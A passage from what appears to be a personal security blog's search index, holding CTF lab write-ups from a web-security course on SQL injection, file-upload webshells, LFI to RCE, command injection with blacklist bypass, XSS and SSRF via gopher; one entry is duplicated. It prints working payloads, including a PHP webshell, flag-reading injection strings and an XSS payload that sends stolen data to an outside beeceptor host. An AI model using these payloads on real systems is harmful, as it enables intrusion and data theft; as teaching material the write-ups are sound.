@app.route(\u0026#34;/\u0026#34;) def home(): return render_template(\u0026#34;index.html\u0026#34;, failed=request.args.get(\u0026#39;failed\u0026#39;) != None) @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def login(): username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) if not username or not password: return redirect(\u0026#34;/?failed\u0026#34;) cur = get_db().execute(f\u0026#34;SELECT * FROM admin WHERE (username=\u0026#39;{username}\u0026#39;)\u0026#34;) res = cur.fetchone() cur.close() if res[\u0026#39;username\u0026#39;] == \u0026#39;admin\u0026#39; and res[\u0026#39;password\u0026#39;] == password: return \u0026#34;FLAG: FLAG{\u0026lt;REDACTED\u0026gt;}\u0026#34; return redirect(\u0026#34;/?failed\u0026#34;) @app.route(\u0026#34;/source\u0026#34;) def source(): import re source_code = open(__file__).read() source_code = re.sub(r\u0026#39;FLAG{[^}\\s]+}\u0026#39;, \u0026#39;FLAG{\u0026lt;REDACTED\u0026gt;}\u0026#39;, source_code, 1) return Response(source_code, mimetype=\u0026#39;text/plain\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) :::\nExploit - SQLi + union syntax # Observe source code first It must receive username and password together, or failed otherwise. Thus, we can not use previous payload. Union syntax Username Payload → ') union select 'admin', 'password' -- # Password → password SELECT * FROM admin WHERE (username=\u0026rsquo;\u0026rsquo;) union select \u0026lsquo;admin\u0026rsquo;, \u0026lsquo;password\u0026rsquo; \u0026ndash; #\u0026rsquo;) Flag: FLAG: FLAG{un10n_bas3d_sqli}\n"},{"id":437,"href":"/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/","title":"Simple Web 0x04(Lab - Image Space 0x01)","section":"Securities","content":" Simple Web 0x04(Lab - Image Space 0x01) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9010\nSource code # :::spoiler code\n\u0026lt;?php if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); exit; } ?\u0026gt; \u0026lt;h1\u0026gt;Image Uploader\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Only supports: jpg, jpeg, png\u0026lt;/p\u0026gt; \u0026lt;!-- upload form --\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image_file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;View Source\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;?php if (!isset($_FILES[\u0026#39;image_file\u0026#39;])) { die(\u0026#39;Give me a file!\u0026#39;); } $filename = basename($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;name\u0026#39;]); $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;images/${prefix}_${filename}\u0026#34;); echo \u0026#34;\u0026lt;img src=\\\u0026#34;images/${prefix}_${filename}\\\u0026#34;\u0026gt;\u0026#34;; ?\u0026gt; :::\nThere\u0026rsquo;s no any protection. Therefore, upload webshell and get shell\nExploit - webshell # Payload: \u0026lt;?php system($_GET[\u0026quot;sh\u0026quot;]); ?\u0026gt; view-source:http://h4ck3r.quest:9010/images/09956fc7c4f424b0_simple.php?sh=cat%20../../../../flag\n"},{"id":438,"href":"/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/","title":"Simple Web 0x05(Lab - Image Space 0x02)","section":"Securities","content":" Simple Web 0x05(Lab - Image Space 0x02) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9011\nSource code # :::spoiler\n\u0026lt;?php if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); exit; } ?\u0026gt; \u0026lt;h1\u0026gt;Image Uploader\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Only supports: jpg, jpeg, png\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image_file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;View Source\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;?php if (!isset($_FILES[\u0026#39;image_file\u0026#39;])) { die(\u0026#39;Give me a file!\u0026#39;); } $filename = basename($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;name\u0026#39;]); $extension = strtolower(explode(\u0026#34;.\u0026#34;, $filename)[1]); if (!in_array($extension, [\u0026#39;png\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;jpg\u0026#39;]) !== false) { die(\u0026#34;Invalid file extension: $extension.\u0026#34;); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;images/${prefix}_${filename}\u0026#34;); echo \u0026#34;\u0026lt;img src=\\\u0026#34;/images/${prefix}_${filename}\\\u0026#34;\u0026gt;\u0026#34;; ?\u0026gt; :::\nExtension checked by white list: .png, .jpeg, jpg Exploit - bypass extension # Change the filename to webshell.png.php then upload to get shell.\n"},{"id":439,"href":"/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/","title":"Simple Web 0x06(Lab - Image Space 0x03)","section":"Securities","content":" Simple Web 0x06(Lab - Image Space 0x03) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:9012\nBackground # file signature\nSource code # :::spoiler\n\u0026lt;?php if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); exit; } ?\u0026gt; \u0026lt;h1\u0026gt;Image Uploader\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Only supports: jpg, jpeg, png\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image_file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;View Source\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;?php if (!isset($_FILES[\u0026#39;image_file\u0026#39;])) { die(\u0026#39;Give me a file!\u0026#39;); } $filename = basename($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;name\u0026#39;]); $extension = strtolower(explode(\u0026#34;.\u0026#34;, $filename)[1]); if (!in_array($extension, [\u0026#39;png\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;jpg\u0026#39;]) !== false) { die(\u0026#34;Invalid file extension: $extension.\u0026#34;); } if (in_array($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;type\u0026#39;], [\u0026#34;image/png\u0026#34;, \u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;]) === false) { die(\u0026#34;Invalid file type: \u0026#34; . $_SERVER[\u0026#34;CONTENT_TYPE\u0026#34;]); } list($_, $_, $type) = getimagesize($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($type !== IMAGETYPE_JPEG \u0026amp;\u0026amp; $type !== IMAGETYPE_PNG) { die(\u0026#34;Invalid image type.\u0026#34;); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES[\u0026#39;image_file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;images/${prefix}_${filename}\u0026#34;); echo \u0026#34;\u0026lt;img src=\\\u0026#34;/images/${prefix}_${filename}\\\u0026#34;\u0026gt;\u0026#34;; ?\u0026gt; ::: It has 2 extra constraint must be bypassed. Use burpsuite and change valid file signature\nExploit - bypass IMAGETYPE + bypass $_FILES['image_file']['type'] # HxD - bypass IMAGETYPE Add valid file signature at the beginning from wiki page png: 89 50 4E 47 0D 0A 1A 0A jpg: FF D8 FF DB burpsuite - bypass file type Then we got shell!!! payload: http://h4ck3r.quest:9012/images/353d74c11becb9b1_webshell_valid_filetype.png.php?sh=cat%20../../../../flag "},{"id":440,"href":"/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/","title":"Simple Web 0x07(Lab - `HakkaMD`)","section":"Securities","content":" Simple Web 0x07(Lab - HakkaMD) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8401\nBackground # 資安這條路-Local File Inclusion\nExploit - LFI to RCE # First things first, the website has LFI problem http://h4ck3r.quest:8401/?module=/etc/passwd 通靈 It provided phpinfo() so that we can check the save address of session. The setting is default, thus we can use LFI to read session file: http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1 We can see that session file store the data of what we enter. Therefore, we could enter webshell to get shell webshell \u0026lt;?php system($_GET['sh']); ?\u0026gt; ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal\u0026amp;sh=ls%20/ ↓ ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal\u0026amp;sh=cat%20/flag_aff6136bbef82137 Then we got flag!!! "},{"id":441,"href":"/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/","title":"Simple Web 0x08(Lab - My First Meow Website)","section":"Securities","content":" Simple Web 0x08(Lab - My First Meow Website) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8400/ Target: Login as Admin\nBackground # PHP 偽協議 (一) Web Security 0x1\nExploit # Observe According to the URL, http://h4ck3r.quest:8400/?page=inc/home, it might have LFI problem. Use php://filter to read page http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home :::spoiler page source code \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Meow\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar is-dark\u0026#34; role=\u0026#34;navigation\u0026#34; aria-label=\u0026#34;main navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-brand\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-item\u0026#34; href=\u0026#34;/?page=inc/home\u0026#34;\u0026gt;🐱\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;navbarBasicExample\u0026#34; class=\u0026#34;navbar-menu\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-start\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-item\u0026#34; href=\u0026#34;/?page=inc/home\u0026#34;\u0026gt; Home \u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;navbar-item\u0026#34; href=\u0026#34;/?page=inc/about\u0026#34;\u0026gt; About \u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;navbar-item\u0026#34; href=\u0026#34;/admin.php\u0026#34;\u0026gt; Admin \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34; style=\u0026#34;margin-top: 1em;\u0026#34;\u0026gt; \u0026lt;?php if (isset($_GET[\u0026#39;page\u0026#39;])) include($_GET[\u0026#39;page\u0026#39;] . \u0026#34;.php\u0026#34;); else include(\u0026#34;inc/home.php\u0026#34;); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ::: Observe page source code We know that admin.php is under / directory. http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin :::spoiler admin source code \u0026lt;h1\u0026gt;Admin Panel\u0026lt;/h1\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php $admin_account = array(\u0026#34;username\u0026#34; =\u0026gt; \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ\u0026#34;); if ( isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;username\u0026#39;] === $admin_account[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $_GET[\u0026#39;password\u0026#39;] === $admin_account[\u0026#39;password\u0026#39;] ) { echo \u0026#34;\u0026lt;h1\u0026gt;LOGIN SUCCESS!\u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;\u0026#34;.getenv(\u0026#39;FLAG\u0026#39;).\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; ::: Then we get admin password is: kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ. Then we got flag!!! "},{"id":442,"href":"/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/","title":"Simple Web 0x09(Lab - DNS Lookup Tool)","section":"Securities","content":" Simple Web 0x09(Lab - DNS Lookup Tool) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8300/\nSource code # :::spoiler code\n\u0026lt;?php isset($_GET[\u0026#39;source\u0026#39;]) and die(show_source(__FILE__, true)); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;DNS Lookup Tool | Baby\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;section class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;column is-6 is-offset-3 has-text-centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;DNS Lookup Tool 🔍\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;field\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;control\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;example.com\u0026#34; id=\u0026#34;hostname\u0026#34; value=\u0026#34;\u0026lt;?= $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;\u0026#39; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;button is-block is-info is-fullwidth\u0026#34;\u0026gt; Lookup! \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;name\u0026#39;])) : ?\u0026gt; \u0026lt;section class=\u0026#34;has-text-left\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lookup result:\u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;?= shell_exec(\u0026#34;host \u0026#39;\u0026#34; . $_POST[\u0026#39;name\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;) ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a id=\u0026#34;magic\u0026#34;\u0026gt;Magic\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;article class=\u0026#34;message is-link is-hidden is-size-4\u0026#34; id=\u0026#34;hint\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;message-body is-family-monospace\u0026#34;\u0026gt; host \u0026#39;\u0026lt;span class=\u0026#34;has-text-danger\u0026#34; id=\u0026#34;command\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026#39;; \u0026lt;/div\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script\u0026gt; magic.onclick = () =\u0026gt; hint.classList.toggle(\u0026#34;is-hidden\u0026#34;); window.onload = hostname.oninput = () =\u0026gt; command.textContent = hostname.value; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nExploit # According to the source code, seems there\u0026rsquo;s no any protection. shell_exec It used shell_exec to parse input string. shell_exec(\u0026quot;host '\u0026quot; . $_POST['name'] . \u0026quot;';\u0026quot;) shell_exec(\u0026quot;host '\u0026quot; . ';ls /flag*' . \u0026quot;';\u0026quot;)→host '';ls /flag*''; ↓ shell_exec(\u0026quot;host '\u0026quot; . ';cat /flag_44ebd3936a907d59'. \u0026quot;';\u0026quot;) Note that, you can use psysh or php -a in Linux with interactive mode to try the payload Then we got flag!!! Reference # PHP system()、exec()、shell_exec() 的 差異\n"},{"id":443,"href":"/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/","title":"Simple Web 0x10(Lab - DNS Lookup Tool | WAF)","section":"Securities","content":" Simple Web 0x10(Lab - DNS Lookup Tool | WAF) # tags: NTUSTWS CTF Web # Background # 2022/03/30 網頁安全 Command injection\nSource code # :::spoiler code\n\u0026lt;?php isset($_GET[\u0026#39;source\u0026#39;]) and die(show_source(__FILE__, true)); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;DNS Lookup Tool | WAF\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;section class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;column is-6 is-offset-3 has-text-centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;DNS Lookup Tool 🔍 | WAF Edition\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;field\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;control\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;example.com\u0026#34; id=\u0026#34;hostname\u0026#34; value=\u0026#34;\u0026lt;?= $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;\u0026#39; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;button is-block is-info is-fullwidth\u0026#34;\u0026gt; Lookup! \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;name\u0026#39;])) : ?\u0026gt; \u0026lt;section class=\u0026#34;has-text-left\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lookup result:\u0026lt;/p\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php $blacklist = [\u0026#39;|\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#34;\\n\u0026#34;, \u0026#39;flag\u0026#39;]; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST[\u0026#39;name\u0026#39;], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) system(\u0026#34;host \u0026#39;\u0026#34; . $_POST[\u0026#39;name\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;); else echo \u0026#34;HACKER!!!\u0026#34;; ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ::: It set some protection such as blacklist.\nExploit # Use $ or ` string to bypass blacklist Payload: '$(cat /fla*)' 'cat /fl*g*'\nFlag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}\nReference # "},{"id":444,"href":"/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/","title":"Simple Web 0x11(Lab - XSS Me)","section":"Securities","content":" Simple Web 0x11(Lab - XSS Me) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8800/\nBackground # :::spoiler 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取COOKIE之類的) :::\nSource code # ... \u0026lt;script\u0026gt; const message = {\u0026#34;icon\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;titleText\u0026#34;: \u0026#34;User not found.\u0026#34;, \u0026#34;timer\u0026#34;: 3000, \u0026#34;showConfirmButton\u0026#34;: false, \u0026#34;timerProgressBar\u0026#34;: true}; window.onload = function () { if (message !== null) Swal.fire(message); } \u0026lt;/script\u0026gt; ... Exploit # Check XSS ... \u0026lt;script\u0026gt; const message = {\u0026#34;icon\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;titleText\u0026#34;: \u0026#34;youshallnotpass\u0026#34;, \u0026#34;timer\u0026#34;: 3000, \u0026#34;showConfirmButton\u0026#34;: false, \u0026#34;timerProgressBar\u0026#34;: true}; window.onload = function () { if (message !== null) Swal.fire(message); } \u0026lt;/script\u0026gt; ... Try to inject script tag Payload: http://h4ck3r.quest:8800/?type=error\u0026amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E// ... \u0026lt;script\u0026gt; const message = {\u0026#34;icon\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;titleText\u0026#34;: \u0026#34;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;//\u0026#34;, \u0026#34;timer\u0026#34;: 3000, \u0026#34;showConfirmButton\u0026#34;: false, \u0026#34;timerProgressBar\u0026#34;: true}; window.onload = function () { if (message !== null) Swal.fire(message); } \u0026lt;/script\u0026gt; Hint If you login as guest(password = guest), then you can get the response Fetch flag and send to beeceptor Payload:\nhttp://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag\\).then(r=%3Er.text()).then(flag=%3Elocation.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`)%3C/script%3E// Report to admin. Then you got flag!!!\n"},{"id":445,"href":"/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/","title":"Simple Web 0x12(Lab - Web Preview Card)","section":"Securities","content":" Simple Web 0x12(Lab - Web Preview Card) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8500/\nBackground # Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」\nExploit - SSRF # When you see a preview function, then it may have SSRF problem.\nTest it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code\n\u0026lt;?php if ($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39;) die(\u0026#34;Only for localhost user.\u0026#34;); ?\u0026gt; \u0026lt;form action=\u0026#34;/flag.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; Do you want the FLAG? \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;givemeflag\u0026#34; value=\u0026#34;no\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;givemeflag\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;givemeflag\u0026#39;] === \u0026#39;yes\u0026#39;) echo \u0026#34;FLAG:\u0026#34;, getenv(\u0026#39;FLAG\u0026#39;); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.\nConstruct package - gopher\nPOST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Length: 14 Content-Type: application/x-www-form-urlencoded givemeflag=yes Transferred by urlencode with CRLF type. Payload: gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a\nThen we got flag\u0026hellip;\nFlag: FLAG{gopher://http_post}\n"},{"id":446,"href":"/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/","title":"Simple Web 0x12(Lab - Web Preview Card)","section":"Securities","content":" Simple Web 0x12(Lab - Web Preview Card) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8500/\nBackground # Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」\nExploit - SSRF # When you see a preview function, then it may have SSRF problem.\nTest it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code\n\u0026lt;?php if ($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] !== \u0026#39;127.0.0.1\u0026#39;) die(\u0026#34;Only for localhost user.\u0026#34;); ?\u0026gt; \u0026lt;form action=\u0026#34;/flag.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; Do you want the FLAG? \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;givemeflag\u0026#34; value=\u0026#34;no\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;givemeflag\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;givemeflag\u0026#39;] === \u0026#39;yes\u0026#39;) echo \u0026#34;FLAG:\u0026#34;, getenv(\u0026#39;FLAG\u0026#39;); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.\nConstruct package - gopher\nPOST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Length: 14 Content-Type: application/x-www-form-urlencoded givemeflag=yes Transferred by urlencode with CRLF type. Payload: gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a\nThen we got flag\u0026hellip;\nFlag: FLAG{gopher://http_post}\n"},{"id":447,"href":"/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/","title":"Simple Web 